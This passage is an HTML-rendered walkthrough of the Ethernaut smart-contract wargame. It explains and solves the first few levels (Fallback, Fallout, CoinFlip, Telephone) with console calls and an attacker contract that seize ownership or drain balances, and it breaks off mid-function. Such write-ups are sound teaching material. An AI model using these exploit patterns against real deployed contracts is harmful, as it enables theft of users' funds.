<li><a class="chakra-link css-9olwc6" href="#force">Force</a></li>
<li><a class="chakra-link css-9olwc6" href="#vault">Vault</a></li>
<li><a class="chakra-link css-9olwc6" href="#king">King</a></li>
<li><a class="chakra-link css-9olwc6" href="#re-entrancy">Re-entrancy</a></li>
<li><a class="chakra-link css-9olwc6" href="#elevator">Elevator</a></li>
<li><a class="chakra-link css-9olwc6" href="#privacy">Privacy</a></li>
<li><a class="chakra-link css-9olwc6" href="#gatekeeper-one">Gatekeeper One</a>
<ul>
<li><a class="chakra-link css-9olwc6" href="#gateone">gateOne</a></li>
<li><a class="chakra-link css-9olwc6" href="#gatethree">gateThree</a></li>
<li><a class="chakra-link css-9olwc6" href="#gatetwo">gateTwo</a></li>
</ul>
</li>
<li><a class="chakra-link css-9olwc6" href="#gatekeeper-two">GateKeeper Two</a>
<ul>
<li><a class="chakra-link css-9olwc6" href="#gateone-1">GateOne</a></li>
<li><a class="chakra-link css-9olwc6" href="#gatetwo-1">GateTwo</a></li>
<li><a class="chakra-link css-9olwc6" href="#gatethree-1">gateThree</a></li>
</ul>
</li>
<li><a class="chakra-link css-9olwc6" href="#naught-coin">Naught Coin</a></li>
<li><a class="chakra-link css-9olwc6" href="#perservation">Perservation</a></li>
<li><a class="chakra-link css-9olwc6" href="#recovery">Recovery</a></li>
<li><a class="chakra-link css-9olwc6" href="#magic-number">Magic Number</a></li>
<li><a class="chakra-link css-9olwc6" href="#alien-codex">Alien Codex</a></li>
<li><a class="chakra-link css-9olwc6" href="#denial">Denial</a></li>
<li><a class="chakra-link css-9olwc6" href="#shop">Shop</a></li>
<li><a class="chakra-link css-9olwc6" href="#dex">Dex</a></li>
<li><a class="chakra-link css-9olwc6" href="#dex-2">Dex 2</a></li>
<li><a class="chakra-link css-9olwc6" href="#challenge-description">Challenge Description</a>
<ul>
<li><a class="chakra-link css-9olwc6" href="#solidity-contract-for-test-and-for-the-token3">Solidity Contract for test and for the token3</a></li>
</ul>
</li>
<li><a class="chakra-link css-9olwc6" href="#puzzlewallet">PuzzleWallet</a></li>
<li><a class="chakra-link css-9olwc6" href="#motorbike">Motorbike</a></li>
</ul>
</li>
</ul>
<style data-emotion="css 1uc67dn">.css-1uc67dn{font-family:Sen;font-weight:var(--chakra-fontWeights-bold);font-size:40px;line-height:1.33;color:#FACE7E;margin-top:var(--chakra-space-24);margin-bottom:var(--chakra-space-8);}@media screen and (min-width: 48em){.css-1uc67dn{line-height:1.2;}}</style><h2 class="chakra-heading css-1uc67dn" id="hello ethernaut">Hello Ethernaut</h2>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">This challenge is a warm-up challenge and for those who doesn&#x27;t know how to interact with contracts using the js libraries.</p>
</blockquote>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">info</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">info1</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">info2</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;hello&quot;</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">infoNum</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">info42</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">theMethodName</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">method7123949</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span></span><span class="token" style="color:#6a9955">// Here we are asked to submit the password that we know to authenticate but we didn&#x27;t interact with any passwords. A quick guess, password is a public field in the contract </span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span></span><span class="token" style="color:#569CD6">const</span><span> password </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">password</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#6a9955">// We fetch the values of variables as methods</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">authenticate</span><span class="token" style="color:#d4d4d4">(</span><span>password</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="fallback">Fallback</h2>
<p class="chakra-text css-0" node="[object Object]"><style data-emotion="css gv9qss">.css-gv9qss{font-weight:700;color:var(--chakra-colors-red-400);font-size:var(--chakra-fontSizes-lg);}</style><span class="chakra-text css-gv9qss">Challenge description</span></p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">You will beat this level if
- you claim ownership of the contract
- you reduce its balance to 0</p>
</blockquote>
<style data-emotion="css 17l36zw">.css-17l36zw{margin-top:60px;margin-bottom:60px;height:1px;background-color:#3d5a80;}</style><div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">a quick run through the code of the challenge, I extracted the valuable methods and variables we will be using.</p>
<p class="chakra-text css-0" node="[object Object]"><style data-emotion="css bwdt07">.css-bwdt07{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background-color:var(--chakra-colors-transparent);margin-top:var(--chakra-space-12);margin-bottom:var(--chakra-space-12);position:inherit;--chakra-backdrop-blur:blur(var(--chakra-blur-none));z-index:4;-webkit-margin-start:auto;margin-inline-start:auto;-webkit-margin-end:auto;margin-inline-end:auto;width:auto;height:auto;left:0px;bottom:0px;--chakra-translate-y:50%;}.css-bwdt07>*:not(style)~*:not(style){margin-top:0.5rem;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}</style><div class="chakra-stack css-bwdt07"><style data-emotion="css 1pb7l90">.css-1pb7l90{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;margin-top:var(--chakra-space-12);margin-bottom:var(--chakra-space-12);-webkit-margin-start:var(--chakra-space-1);margin-inline-start:var(--chakra-space-1);-webkit-margin-end:var(--chakra-space-1);margin-inline-end:var(--chakra-space-1);max-width:1300px;position:relative;}.css-1pb7l90>*:not(style)~*:not(style){margin-top:0.5rem;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}</style><div class="chakra-stack css-1pb7l90"><style data-emotion="css 1ui0t94">.css-1ui0t94{min-width:20vw;max-width:1200px;position:relative;}</style><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138025/c323ec3e81e2a66f654995386118d6903a9758b1fa877d780d521e99db208afb_eejfmr.png" alt="Contribute Method" style="scale:1.2px;width:100%"/></div><style data-emotion="css 1qz7fzr">.css-1qz7fzr{-webkit-align-self:center;-ms-flex-item-align:center;align-self:center;-webkit-margin-start:auto;margin-inline-start:auto;-webkit-margin-end:auto;margin-inline-end:auto;width:-webkit-fit-content;width:-moz-fit-content;width:fit-content;text-align:center;}</style><p class="chakra-text css-1qz7fzr">Contribute Method</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Here we see how the contribute method works. Pretty simple we send ether and it&#x27;s recorded for us.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/90f03025307c6a50bdc53647caac2e2e1e9711fb1fafb173d6765a8668e4bedf_hox5ei.png" alt="fallback method" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">fallback method</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Okay the <span class="chakra-text css-gv9qss">receive</span> part. As we see here we are defining a function but without the <em>function</em> keyword. That&#x27;s because the receive function is a <em>fallback</em> function, let&#x27;s say some kind of function that should be existing in all smart contracts but here we are overriding its behaviour.
Actually, since the version 0.6.0 we got two functions to handle fallback cases. <em>fallback</em> and <em>receive</em>. a little explainer of how they are called ...</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#6a9955">// Explainer from: https://solidity-by-example.org/fallback/</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    </span><span class="token" style="color:#6a9955">// Ether is sent to contract</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    </span><span class="token" style="color:#6a9955">//      is msg.data empty?</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>    </span><span class="token" style="color:#6a9955">//          /   \ </span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>    </span><span class="token" style="color:#6a9955">//         yes  no</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>    </span><span class="token" style="color:#6a9955">//         /     \</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>    </span><span class="token" style="color:#6a9955">//    receive()?  fallback() </span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>    </span><span class="token" style="color:#6a9955">//     /   \ </span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>    </span><span class="token" style="color:#6a9955">//   yes   no</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>    </span><span class="token" style="color:#6a9955">//  /        \</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span>    </span><span class="token" style="color:#6a9955">//receive()  fallback()</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">So what we need to do here actually ?</p>
<ol>
<li>Contribute so we have a contribution <span class="chakra-text css-gv9qss">value non nul</span>.</li>
<li>Trigger the fallback function by sending ether to the contract.</li>
</ol>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">contribute</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">value</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#dcdcaa">toWei</span><span class="token" style="color:#d4d4d4">(</span><span>etherValue</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">sendTransaction</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">value</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#dcdcaa">toWei</span><span class="token" style="color:#d4d4d4">(</span><span>etherValue</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="fallout">Fallout</h2>
<p class="chakra-text css-0" node="[object Object]">Constructors in solidity are quite a story and they were the source of a big -----
<span class="chakra-text css-gv9qss">Exploitation</span>.
Here the challenge is quite simple. All we have is to notice the typo in the constructor function name which makes it a normal <span class="chakra-text css-gv9qss">public</span> function that we can call to get the contract ownership.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">Fal1out</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<h2 class="chakra-heading css-1uc67dn" id="coinflip">CoinFlip</h2>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">Randomness is just a myth.</code></p>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">You&#x27;ll need to use your psychic abilities to guess the correct outcome 10 times in a row.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">In blockchain randomness is just quite the issue, not only in the blockchain really that implies for all computers systems and is due to the way we are trying to make deterministic systems have an deterministic results. The matter for the blockchain is its transparency making even finding a seed a quite impossible.</p>
<p class="chakra-text css-0" node="[object Object]">Here we see the function of coinFlip
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/a4a71eed827fde83d6d4140e52f376aa5b2cbea20f1587a156118f7e65fa480b_czfni3.png" alt="CoinFlip method" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">CoinFlip method</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">our seed is actually <code class="inline-code">block.number</code> but we can know this value easily from the blockchain. So all we have is create a contract that feeds the flip function the values she expect 😈</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/1c39007c6e59a8ac5b4a23a23c83efc645c1ed4665dcc7686fe83f28d39bb34a_saizwt.png" alt="CoinFlip Attack" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">CoinFlip Attack</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Now all we have to do is call the contract method 10 times.</p>
<h2 class="chakra-heading css-1uc67dn" id="telephone">Telephone</h2>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<ul>
<li>Claim ownership of the contract.</li>
</ul>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138025/d794be949c9e5c756d0940618ff646c8dd477ab3f134d3973baac079ec09be4f_xqkdnr.png" alt="Telephone method" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Telephone method</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Here we see the condition being checked is as simple as <code class="inline-code">tx.origin != msg.sender</code> but what does <code class="inline-code">tx.origin</code> means ?
Actually <code class="inline-code">tx</code> is a global variable in the smart contract ( same as js global variables ) and it means the transaction that have been initiated on the function call.
When we call a method from web3 actually we are interacting directly with the smart contract so it will initiate the transaction but when we call a contract from another contract the <code class="inline-code">tx.origin == caller.address</code></p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<p class="chakra-text css-0" node="[object Object]">Based on our analysis we understand all we need is to call the function from an evil contract and pass our address as parameter.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">TelephoneInterface</span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">changeOwner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address _owner</span><span class="token" style="color:#d4d4d4">)</span><span> external</span><span class="token" style="color:#d4d4d4">;</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>contract </span><span class="token" style="color:#4ec9b0">EvilContract</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>    
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>    </span><span class="token" style="color:#4ec9b0">TelephoneInterface</span><span> victimContract</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>    </span><span class="token" style="color:#dcdcaa">contructor</span><span class="token" style="color:#d4d4d4">(</span><span>address victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>        victimContract </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">TelephoneInterface</span><span class="token" style="color:#d4d4d4">(</span><span>victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">becomeOwner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address newOwner</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
